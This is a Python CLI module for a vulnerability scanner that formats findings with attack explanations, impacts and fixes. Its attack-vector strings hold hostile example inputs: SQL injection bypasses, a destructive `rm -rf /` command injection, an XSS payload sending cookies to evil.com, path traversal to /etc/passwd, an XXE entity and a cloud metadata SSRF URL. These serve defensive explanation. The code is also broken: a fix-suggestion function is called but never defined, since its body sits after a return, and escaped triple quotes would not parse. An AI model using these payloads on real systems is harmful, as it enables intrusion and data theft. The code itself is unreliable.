"""
Main CLI entrypoint for NULL-CODE-ANALYZER
Typer-based command interface with rich output
"""

import sys
import os
from pathlib import Path
from typing import Optional

import typer
from rich.console import Console
from rich.table import Table
from rich.panel import Panel
from rich.text import Text

from nullcode.core import Scanner, ScanResult, VulnerabilityMatch
from nullcode.ui import Animations, ETHICS_DISCLAIMER, LOGO, REPORT_FOOTER
from nullcode.utils import GitDiff, SARIFExporter, JSONExporter, HTMLExporter


# Initialize Typer app
app = typer.Typer(
    name="nullcode",
    help="AI-powered vulnerability scanner for ethical hackers",
    add_completion=False,
)

# Rich console for beautiful output
console = Console(style="white on black")
animations = Animations(console)

# Ethics acceptance file
ETHICS_FILE = Path.home() / ".nullcode" / ".ethics_accepted"


def check_ethics_acceptance() -> bool:
    """Check if user has accepted ethical usage terms"""
    return ETHICS_FILE.exists()


def save_ethics_acceptance() -> None:
    """Save ethics acceptance to file with timestamp"""
    from datetime import datetime
    
    ETHICS_FILE.parent.mkdir(parents=True, exist_ok=True)
    
    # Save acceptance with timestamp for audit trail
    with open(ETHICS_FILE, 'w') as f:
        f.write(f"Accepted on: {datetime.utcnow().isoformat()}Z\n")
        f.write("User affirmed compliance with IT Act 2000 (India)\n")


def require_ethics(i_accept_ethics: bool) -> None:
    """Require ethics acceptance before scanning"""
    if not check_ethics_acceptance() and not i_accept_ethics:
        console.print(ETHICS_DISCLAIMER, style="white")
        console.print("\n[white bold]To proceed, run with --i-accept-ethics flag[/white bold]")
        console.print("[bright_black]Example: nullcode scan . --i-accept-ethics[/bright_black]\n")
        raise typer.Exit(code=1)
    
    if i_accept_ethics and not check_ethics_acceptance():
        save_ethics_acceptance()
        console.print("[white]✓ Ethical usage terms accepted and logged[/white]")
        console.print("[bright_black]Acceptance logged at: ~/.nullcode/.ethics_accepted[/bright_black]\n")


@app.command()
def scan(
    path: str = typer.Argument(
        ".",
        help="Path to project directory or file to scan"
    ),
    mode: str = typer.Option(
        "hybrid",
        "--mode",
        "-m",
        help="Scan mode: quick (regex), deep (AI), or hybrid (both)"
    ),
    threshold: int = typer.Option(
        70,
        "--threshold",
        "-t",
        help="Minimum confidence threshold (0-100)"
    ),
    output: Optional[str] = typer.Option(
        None,
        "--output",
        "-o",
        help="Output JSON report to file"
    ),
    sarif: bool = typer.Option(
        False,
        "--sarif",
        help="Generate SARIF format report (report.sarif)"
    ),
    html: Optional[str] = typer.Option(
        None,
        "--html",
        help="Generate HTML dashboard report"
    ),
    diff: bool = typer.Option(
        False,
        "--diff",
        help="Scan only files changed in git (vs last commit)"
    ),
    ci: bool = typer.Option(
        False,
        "--ci",
        help="CI mode: no animations, exit code 1 if vulnerabilities found"
    ),
    i_accept_ethics: bool = typer.Option(
        False,
        "--i-accept-ethics",
        help="Accept ethical usage terms (required on first run)"
    ),
):
    """
    Scan code for security vulnerabilities
    
    Examples:
        nullcode scan ./my-project
        
        nullcode scan ./app --mode deep --threshold 85
        
        nullcode scan . --output report.json --html dashboard.html
        
        nullcode scan . --diff --ci
    """
    # Check ethics acceptance
    require_ethics(i_accept_ethics)
    
    # Validate mode
    if mode not in ["quick", "deep", "hybrid"]:
        console.print(f"[white]Error: Invalid mode '{mode}'. Choose: quick, deep, or hybrid[/white]")
        raise typer.Exit(code=1)
    
    # Display logo (skip in CI mode)
    if not ci:
        console.clear()
        console.print(LOGO, style="white")
        console.print()
    
    # Initialize scanner
    scanner = Scanner(mode=mode, threshold=threshold)
    
    # Determine files to scan
    target_path = Path(path).resolve()
    if not target_path.exists():
        console.print(f"[white]Error: Path '{path}' does not exist[/white]")
        raise typer.Exit(code=1)
    
    scan_files = None
    
    # Git diff mode
    if diff:
        git_diff = GitDiff(str(target_path))
        if not git_diff.is_git_repo():
            console.print("[white]Error: --diff requires a git repository[/white]")
            raise typer.Exit(code=1)
        
        scan_files = git_diff.get_changed_files()
        if not scan_files:
            console.print("[white]No files changed in git[/white]")
            raise typer.Exit(code=0)
        
        console.print(f"[white]Scanning {len(scan_files)} changed files...[/white]\n")
    
    # Display scan info
    if not ci:
        info = Table.grid(padding=(0, 2))
        info.add_row("[white]Mode:[/white]", f"[bright_black]{mode.upper()}[/bright_black]")
        info.add_row("[white]Threshold:[/white]", f"[bright_black]{threshold}%[/bright_black]")
        info.add_row("[white]Target:[/white]", f"[bright_black]{target_path}[/bright_black]")
        
        # Show hybrid AI status for deep/hybrid modes
        if mode in ["deep", "hybrid"]:
            try:
                from nullcode.core import AIEngine
                engine = AIEngine()
                hybrid_status = engine.get_hybrid_status()
                
                ai_status = "✓ Cached" if hybrid_status["ai_model_cached"] else "⚠ Will download"
                semgrep_status = "✓ Available" if hybrid_status["semgrep_available"] else "✗ Not installed"
                
                info.add_row("[white]AI Model:[/white]", f"[bright_black]{ai_status}[/bright_black]")
                info.add_row("[white]Semgrep:[/white]", f"[bright_black]{semgrep_status}[/bright_black]")
                
                if hybrid_status["mode"] == "hybrid":
                    info.add_row("[white]Strategy:[/white]", "[bright_black]Hybrid (AI + Semgrep)[/bright_black]")
                else:
                    info.add_row("[white]Strategy:[/white]", "[bright_black]AI only (install semgrep for hybrid)[/bright_black]")
            except Exception:
                pass
        
        console.print(Panel(info, border_style="white", title="[white]Scan Configuration[/white]"))
        console.print()
    
    # Run scan
    try:
        if not ci:
            console.print("[white]Scanning...[/white]")
        
        scan_result = scanner.scan_project(str(target_path), file_patterns=scan_files)
        
        if not ci:
            console.print()
            animations.scan_complete_animation(len(scan_result.vulnerabilities))
            console.print()
        
    except KeyboardInterrupt:
        console.print("\n[white]Scan interrupted by user[/white]")
        raise typer.Exit(code=130)
    except Exception as e:
        console.print(f"\n[white]Error during scan: {str(e)}[/white]")
        raise typer.Exit(code=1)
    
    # Display results
    display_results(scan_result, ci)
    
    # Export reports
    if output:
        exporter = JSONExporter()
        exporter.export(scan_result, output)
        console.print(f"\n[white]✓ JSON report saved to {output}[/white]")
    
    if sarif:
        sarif_path = "report.sarif"
        exporter = SARIFExporter()
        exporter.export(scan_result.vulnerabilities, sarif_path)
        console.print(f"[white]✓ SARIF report saved to {sarif_path}[/white]")
    
    if html:
        exporter = HTMLExporter()
        exporter.export(scan_result, html)
        console.print(f"[white]✓ HTML dashboard saved to {html}[/white]")
    
    # CI mode: exit with error if vulnerabilities found
    if ci and scan_result.vulnerabilities:
        raise typer.Exit(code=1)


def display_results(scan_result: ScanResult, ci_mode: bool = False) -> None:
    """Display scan results in terminal with detailed, beginner-friendly output"""
    
    # Summary table
    summary = Table(show_header=False, box=None, padding=(0, 2))
    summary.add_row(
        "[white]Files Scanned:[/white]",
        f"[bright_black]{scan_result.scanned_files}/{scan_result.total_files}[/bright_black]"
    )
    summary.add_row(
        "[white]Vulnerabilities:[/white]",
        f"[white bold]{len(scan_result.vulnerabilities)}[/white bold]"
    )
    summary.add_row(
        "[white]Duration:[/white]",
        f"[bright_black]{scan_result.duration:.2f}s[/bright_black]"
    )
    
    console.print(Panel(summary, border_style="white", title="[white]Scan Summary[/white]"))
    console.print()
    
    # Severity breakdown
    stats = _calculate_severity_stats(scan_result.vulnerabilities)
    
    severity_table = Table(show_header=True, box=None)
    severity_table.add_column("Severity", style="white")
    severity_table.add_column("Count", style="white", justify="right")
    severity_table.add_column("Risk Level", style="bright_black")
    
    risk_levels = {
        "critical": "Immediate action required",
        "high": "Fix before deployment",
        "medium": "Address soon",
        "low": "Consider fixing"
    }
    
    for severity in ["critical", "high", "medium", "low"]:
        count = stats.get(severity, 0)
        risk = risk_levels[severity]
        severity_table.add_row(severity.upper(), str(count), risk)
    
    console.print(severity_table)
    console.print()
    
    # Vulnerabilities display with details
    if scan_result.vulnerabilities:
        display_limit = 10 if ci_mode else 25  # Show more in non-CI mode
        
        console.print(f"[white bold]{'─' * 80}[/white bold]")
        console.print(f"[white bold]📋 Detailed Vulnerability Report[/white bold]\n")
        
        for i, vuln in enumerate(scan_result.vulnerabilities[:display_limit], 1):
            _display_vulnerability_detail(i, vuln)
        
        if len(scan_result.vulnerabilities) > display_limit:
            remaining = len(scan_result.vulnerabilities) - display_limit
            console.print(f"[bright_black]... and {remaining} more vulnerabilities[/bright_black]")
            console.print(f"[bright_black]💡 Tip: Use --output report.json for complete results[/bright_black]\n")
        
        # Next steps guidance
        console.print(f"[white bold]{'─' * 80}[/white bold]")
        console.print("[white bold]📋 Recommended Next Steps:[/white bold]\n")
        console.print("[bright_black]1. Review each vulnerability and its fix suggestion above[/bright_black]")
        console.print("[bright_black]2. Generate detailed reports: --output report.json --html dashboard.html[/bright_black]")
        console.print("[bright_black]3. Fix critical/high severity issues first[/bright_black]")
        console.print("[bright_black]4. Re-scan after fixes to verify remediation[/bright_black]")
        console.print("[bright_black]5. Read ETHICS.md for responsible disclosure guidelines[/bright_black]\n")
    else:
        console.print("[white]✅ No vulnerabilities found! Your code looks secure.[/white]\n")
    
    # Footer
    console.print(f"[bright_black]{REPORT_FOOTER}[/bright_black]")


def _display_vulnerability_detail(index: int, vuln: VulnerabilityMatch) -> None:
    """Display a single vulnerability with comprehensive details, reasoning, proof, and attack vectors"""
    
    # Vulnerability header with severity emoji
    severity_symbol = {
        "critical": "🔴",
        "high": "🟠",
        "medium": "🟡",
        "low": "🟢"
    }.get(vuln.severity, "⚪")
    
    console.print(f"\n{'─' * 80}")
    console.print(f"{severity_symbol} [white bold]Issue #{index}: {vuln.type}[/white bold] [{vuln.severity.upper()}]")
    console.print(f"   [bright_black]📍 Line {vuln.line_number} | 🎯 Confidence: {vuln.confidence}% | 🏷️  {vuln.cwe_id}[/bright_black]\n")
    
    # Description and reasoning
    desc_parts = vuln.description.split('|')
    short_desc = desc_parts[0]
    detailed_reason = desc_parts[1] if len(desc_parts) > 1 else "User input is not properly validated or sanitized"
    
    console.print(f"   [white bold]❓ What's the Issue?[/white bold]")
    console.print(f"   {detailed_reason}\n")
    
    # Code snippet with proof
    if vuln.code_snippet and vuln.code_snippet.strip():
        snippet = vuln.code_snippet[:200].strip()
        console.print(f"   [white bold]💻 Vulnerable Code (Proof):[/white bold]")
        console.print(f"   [yellow]│  {snippet}[/yellow]\n")
    
    # Attack Vector Explanation
    attack_vector = _get_attack_vector(vuln.type, vuln.cwe_id)
    if attack_vector:
        console.print(f"   [white bold]⚔️  How Attackers Exploit This:[/white bold]")
        for line in attack_vector.split('\\n'):
            if line.strip():
                console.print(f"   [red]{line}[/red]")
        console.print()
    
    # Impact Assessment
    impact = _get_impact_assessment(vuln.type, vuln.severity, vuln.cwe_id)
    if impact:
        console.print(f"   [white bold]💥 Potential Impact:[/white bold]")
        for line in impact.split('\\n'):
            if line.strip():
                console.print(f"   [red]{line}[/red]")
        console.print()
    
    # Risk Score
    risk_score = _calculate_risk_score(vuln.severity, vuln.confidence)
    console.print(f"   [white bold]📊 Risk Score:[/white bold] {risk_score}/10 ", end="")
    console.print(_get_risk_emoji(risk_score))
    console.print()
    
    # Fix suggestion with detailed remediation
    fix_suggestion = _get_fix_suggestion(vuln.type, vuln.cwe_id)
    if fix_suggestion:
        console.print(f"   [white bold]🛠️  How to Fix (Step-by-Step):[/white bold]")
        for line in fix_suggestion.split('\\n'):
            if line.strip():
                console.print(f"   [green]{line}[/green]")
        console.print()
    
    # References and learning resources
    refs = _get_references(vuln.cwe_id)
    if refs:
        console.print(f"   [white bold]📚 Learn More:[/white bold]")
        for ref in refs:
            console.print(f"   [bright_black]→ {ref}[/bright_black]")
    
    console.print()


def _get_attack_vector(vuln_type: str, cwe_id: str) -> str:
    \"\"\"Get detailed attack vector explanation\"\"\"
    
    attack_vectors = {
        "SQL Injection": \"\"\"1. Attacker inputs: ' OR '1'='1' -- to bypass login
2. Modified query becomes: SELECT * FROM users WHERE username='' OR '1'='1' --
3. All user records are returned, authentication bypassed
4. Attacker gains unauthorized access to admin panel or sensitive data\"\"\",
        
        "Command Injection": \"\"\"1. Attacker inputs: ; rm -rf / or && del /f /s /q C:\\\\*
2. Application executes: legitimate_command; malicious_command
3. Attacker achieves remote code execution (RCE)
4. Full system compromise, data theft, ransomware deployment possible\"\"\",
        
        "Cross-Site Scripting (XSS)": \"\"\"1. Attacker injects: <script>fetch('https://evil.com?c='+document.cookie)</script>
2. Victim's browser executes the script in trusted context
3. Session cookies, tokens stolen and sent to attacker's server
4. Account takeover, phishing, malware distribution follows\"\"\",
        
        "Hardcoded Secret": \"\"\"1. Attacker clones public repository or decompiles binary
2. Finds hardcoded API keys, passwords, or database credentials
3. Uses credentials to access production systems, databases, or APIs
4. Data breach, service disruption, financial fraud occurs\"\"\",
        
        "Path Traversal": \"\"\"1. Attacker inputs: ../../../../etc/passwd or ..\\\\..\\\\Windows\\\\System32\\\\config\\\\SAM
2. Application constructs path without validation
3. Sensitive system files are read/executed
4. Credential theft, privilege escalation, or remote code execution\"\"\",
        
        "Insecure Deserialization": \"\"\"1. Attacker crafts malicious serialized object with embedded code
2. Application deserializes untrusted data without validation
3. Object instantiation triggers arbitrary code execution
4. Complete system compromise, backdoor installation possible\"\"\",
        
        "Buffer Overflow": \"\"\"1. Attacker sends input larger than buffer size
2. Adjacent memory is overwritten with malicious code
3. Return address is modified to point to attacker's shellcode
4. Arbitrary code execution with application's privileges\"\"\",
        
        "XML External Entity (XXE)": \"\"\"1. Attacker sends XML with malicious DOCTYPE: <!DOCTYPE foo [<!ENTITY xxe SYSTEM \"file:///etc/passwd\">]>
2. XML parser resolves external entity and reads local files
3. Sensitive data exfiltrated or SSRF attacks launched
4. Internal network scanning, data theft, denial of service\"\"\",
        
        "Server-Side Request Forgery": \"\"\"1. Attacker provides URL: http://169.254.169.254/latest/meta-data/iam/security-credentials/
2. Server fetches the URL thinking it's legitimate 
3. Cloud metadata service returns IAM credentials
4. Attacker accesses AWS resources, lateral movement in infrastructure\"\"\",
        
        "Prototype Pollution": \"\"\"1. Attacker sends JSON: {\"__proto__\":{\"isAdmin\":true}}
2. Object merge pollutes Object.prototype affecting all objects
3. Authorization checks bypass, privilege escalation occurs
4. Admin panel access, data modification, account takeover\"\"\",
        
        "LDAP Injection": \"\"\"1. Attacker inputs: *)(uid=*))(|(uid=*  
2. LDAP filter becomes: (&(uid=*)(uid=*))(|(uid=*)(privilege=admin))
3. Query returns all user records or triggers different logic
4. Authentication bypass, information disclosure, privilege escalation\"\"\",
        
        "NoSQL Injection": \"\"\"1. Attacker sends: {\"$ne\": null} instead of legitimate value
2. Query matches all documents: db.users.find({password: {$ne: null}})
3. Authentication bypassed or all records returned
4. Data breach, unauthorized access, account compromise\"\"\",
    }
    
    return attack_vectors.get(vuln_type, \"\"\"1. Attacker identifies vulnerable input point
2. Crafts malicious payload exploiting the weakness
3. Application processes malicious input without proper validation
4. Security breach occurs based on specific vulnerability type\"\"\")


def _get_impact_assessment(vuln_type: str, severity: str, cwe_id: str) -> str:
    """Get detailed impact assessment for vulnerability"""
    
    impacts = {
        "SQL Injection": """→ Complete database compromise (read, modify, delete all data)
→ Authentication and authorization bypass
→ Administrative access to application
→ Potential lateral movement to connected systems
→ Regulatory fines (GDPR: up to €20M, CCPA: $7,500  per violation)""",
        
        "Command Injection": """→ Complete server compromise and remote code execution
→ Data exfiltration (customer data, trade secrets, credentials)
→ Ransomware deployment and business disruption
→ Backdoor installation for persistent access
→ Regulatory breach notifications and severe fines""",
        
        "Cross-Site Scripting (XSS)": """→ Session hijacking and account takeover
→ Credential theft via keyloggers
→ Phishing attacks against users
→ Malware distribution to visitors
→ Reputational damage and loss of user trust""",
        
        "Hardcoded Secret": """→ Unauthorized access to production systems
→ Data breach affecting thousands/millions of users
→ Service disruption or complete shutdown
→ Financial fraud and theft
→ Legal liability, fines, lawsuits ($millions)""",
        
        "Path Traversal": """→ Sensitive file disclosure (/etc/passwd, config files, source code)
→ Credential theft from configuration files
→ Intellectual property theft
→ Remote code execution if writable directories accessed
→ Complete application compromise""",
        
        "Insecure Deserialization": """→ Arbitrary code execution with application privileges
→ Complete server/application compromise
→ Data theft and manipulation
→ Persistent backdoor installation
→ Lateral movement in infrastructure""",
        
        "Buffer Overflow": """→ Arbitrary code execution at system level
→ Denial of service (application crash)
→ Privilege escalation to root/admin
→ Memory corruption and data manipulation
→ Total system compromise""",
        
        "XML External Entity (XXE)": """→ Internal file disclosure (credentials, source code, configs)
→ Server-Side Request Forgery (SSRF) attacks
→ Denial of Service through billion laughs attack
→ Port scanning and internal network reconnaissance
→ Remote code execution in specific configurations""",
        
        "Server-Side Request Forgery": """→ Cloud metadata access (AWS keys, Azure tokens)
→ Internal network scanning and mapping
→ Access to internal services (databases, admin panels)
→ Pivot point for further attacks
→ Data exfiltration from internal systems""",
        
        "Prototype Pollution": """→ Authentication and authorization bypass
→ Denial of Service
→ Remote Code Execution in Node.js environments
→ Privilege escalation to administrator
→ Data tampering and manipulation""",
        
        "Weak Cryptography": """→ Encrypted data can be decrypted by attackers
→ Password hashes can be cracked via rainbow tables
→ Man-in-the-middle attacks succeed
→ Compliance violations (PCI-DSS, HIPAA)
→ Loss of confidentiality for all 'encrypted' data""",
    }
    
    default = f"""→ Security breach with {severity.upper()} severity
→ Potential data exposure or system compromise
→ Compliance and regulatory risks
→ Reputational damage
→ Financial and legal consequences"""
    
    return impacts.get(vuln_type, default)


def _calculate_risk_score(severity: str, confidence: int) -> float:
    """Calculate risk score (0-10) based on severity and confidence"""
    
    severity_weights = {
        "critical": 10.0,
        "high": 7.5,
        "medium": 5.0,
        "low": 2.5
    }
    
    base_score = severity_weights.get(severity, 5.0)
    confidence_factor = confidence / 100.0
    
    return round(base_score * confidence_factor, 1)


def _get_risk_emoji(risk_score: float) -> str:
    """Get emoji representation of risk score"""
    if risk_score >= 9.0:
        return "☠️  CRITICAL - FIX IMMEDIATELY"
    elif risk_score >= 7.0:
        return "🔥 HIGH - Fix before deployment"
    elif risk_score >= 4.0:
        return "⚠️  MEDIUM - Address soon"
    else:
        return "ℹ️  LOW - Consider fixing"


def _get_references(cwe_id: str) -> list:
    """Get learning resources and references for vulnerability"""
    
    cwe_num = cwe_id.replace("CWE-", "")
    
    base_refs = [
        f"https://cwe.mitre.org/data/definitions/{cwe_num}.html",
        f"https://owasp.org/www-community/vulnerabilities/",
    ]
    
    specific_refs = {
        "CWE-89": [
            "https://cheatsheetseries.owasp.org/cheatsheets/SQL_Injection_Prevention_Cheat_Sheet.html",
            "https://portswigger.net/web-security/sql-injection",
        ],
        "CWE-78": [
            "https://cheatsheetseries.owasp.org/cheatsheets/OS_Command_Injection_Defense_Cheat_Sheet.html",
            "https://owasp.org/www-community/attacks/Command_Injection",
        ],
        "CWE-79": [
            "https://cheatsheetseries.owasp.org/cheatsheets/Cross_Site_Scripting_Prevention_Cheat_Sheet.html",
            "https://portswigger.net/web-security/cross-site-scripting",
        ],
        "CWE-798": [
            "https://cheatsheetseries.owasp.org/cheatsheets/Secrets_Management_Cheat_Sheet.html",
            "https://owasp.org/www-community/vulnerabilities/Use_of_hard-coded_credentials",
        ],
        "CWE-22": [
            "https://cheatsheetseries.owasp.org/cheatsheets/Path_Traversal_Cheat_Sheet.html",
            "https://portswigger.net/web-security/file-path-traversal",
        ],
        "CWE-502": [
            "https://cheatsheetseries.owasp.org/cheatsheets/Deserialization_Cheat_Sheet.html",
            "https://portswigger.net/web-security/deserialization",
        ],
        "CWE-120": [
            "https://cwe.mitre.org/data/definitions/120.html",
            "https://owasp.org/www-community/vulnerabilities/Buffer_Overflow",
        ],
        "CWE-611": [
            "https://cheatsheetseries.owasp.org/cheatsheets/XML_External_Entity_Prevention_Cheat_Sheet.html",
            "https://portswigger.net/web-security/xxe",
        ],
        "CWE-918": [
            "https://cheatsheetseries.owasp.org/cheatsheets/Server_Side_Request_Forgery_Prevention_Cheat_Sheet.html",
            "https://portswigger.net/web-security/ssrf",
        ],
    }
    
    return base_refs + specific_refs.get(cwe_id, [])
    """Get actionable, beginner-friendly fix suggestions"""
    
    fixes = {
        "SQL Injection": """
   → Use parameterized queries (prepared statements)
   ✓ SAFE:   cursor.execute('SELECT * FROM users WHERE id = ?', (user_id,))
   ✗ UNSAFE: cursor.execute(f'SELECT * FROM users WHERE id = {user_id}')
   Learn more: https://cheatsheetseries.owasp.org/cheatsheets/SQL_Injection_Prevention_Cheat_Sheet.html""",
        
        "Command Injection": """
   → Never pass user input directly to shell commands
   ✓ SAFE:   subprocess.run(['ls', '-la', path], shell=False)
   ✗ UNSAFE: os.system(f'ls -la {user_input}')
   → Use input validation with strict allowlists
   Learn more: https://cheatsheetseries.owasp.org/cheatsheets/OS_Command_Injection_Defense_Cheat_Sheet.html""",
        
        "Cross-Site Scripting (XSS)": """
   → Escape all user input before rendering to HTML
   ✓ SAFE:   element.textContent = userInput  (auto-escapes HTML)
   ✗ UNSAFE: element.innerHTML = userInput
   → Use framework built-in sanitization (React escapes by default)
   Learn more: https://cheatsheetseries.owasp.org/cheatsheets/Cross_Site_Scripting_Prevention_Cheat_Sheet.html""",
        
        "Hardcoded Secret": """
   → NEVER commit secrets/credentials to version control
   ✓ SAFE:   api_key = os.environ.get('API_KEY')
   ✗ UNSAFE: api_key = 'sk_live_1234567890abcdef'
   → Use .env files (gitignored) or secret management systems
   → Rotate compromised secrets immediately
   Learn more: https://cheatsheetseries.owasp.org/cheatsheets/Secrets_Management_Cheat_Sheet.html""",
        
        "Path Traversal": """
   → Validate and canonicalize all file paths
   ✓ SAFE:   path = os.path.abspath(os.path.join(base_dir, filename))
            if not path.startswith(os.path.abspath(base_dir)): raise ValueError
   ✗ UNSAFE: path = base_dir + user_input
   → Block '../' sequences and absolute paths
   Learn more: https://cheatsheetseries.owasp.org/cheatsheets/Path_Traversal_Cheat_Sheet.html""",
        
        "Insecure Deserialization": """
   → Use safe serialization formats (JSON, not pickle)
   ✓ SAFE:   data = json.loads(user_input)
            data = yaml.safe_load(user_input)  # Note: safe_load, not load
   ✗ UNSAFE: data = pickle.loads(user_input)
   → Never deserialize data from untrusted sources
   Learn more: https://cheatsheetseries.owasp.org/cheatsheets/Deserialization_Cheat_Sheet.html""",
        
        "Buffer Overflow": """
   → Always use bounded string functions (C/C++)
   ✓ SAFE:   strncpy(dest, src, sizeof(dest)-1); dest[sizeof(dest)-1] = '\\0';
            fgets(buffer, sizeof(buffer), stdin);
   ✗ UNSAFE: strcpy(dest, src); gets(buffer);
   → Check buffer boundaries before all operations
   Learn more: https://cwe.mitre.org/data/definitions/120.html""",
        
        "Security Issue": """
   → Review this code section carefully
   → Follow the principle of least privilege
   → Validate all untrusted input
   → Use security linters and SAST tools
   Learn more: https://owasp.org/www-project-top-ten/""",
    }
    
    return fixes.get(vuln_type, """
   → Apply security best practices for this vulnerability type
   → Review OWASP guidelines: https://owasp.org/
   → Consider getting a security code review""")


def _calculate_severity_stats(vulnerabilities) -> dict:
    """Calculate vulnerability counts by severity"""
    stats = {"critical": 0, "high": 0, "medium": 0, "low": 0}
    for vuln in vulnerabilities:
        stats[vuln.severity] += 1
    return stats


@app.command()
def version():
    """Display version information"""
    console.print(LOGO, style="white")
    console.print("\n[white]Version: 1.0.0[/white]")
    console.print("[bright_black]AI-powered vulnerability scanner for ethical hackers[/bright_black]\n")


@app.command()
def download_models():
    """Download AI models for offline use"""
    console.print("[white]Downloading CodeBERT model...[/white]\n")
    
    try:
        from nullcode.core import AIEngine
        engine = AIEngine()
        engine._ensure_model_downloaded()
        console.print("\n[white]✓ Model downloaded successfully[/white]")
        console.print(f"[bright_black]Cached at: {AIEngine.CACHE_DIR}[/bright_black]\n")
    except Exception as e:
        console.print(f"\n[white]Error downloading model: {str(e)}[/white]\n")
        raise typer.Exit(code=1)


if __name__ == "__main__":
    app()
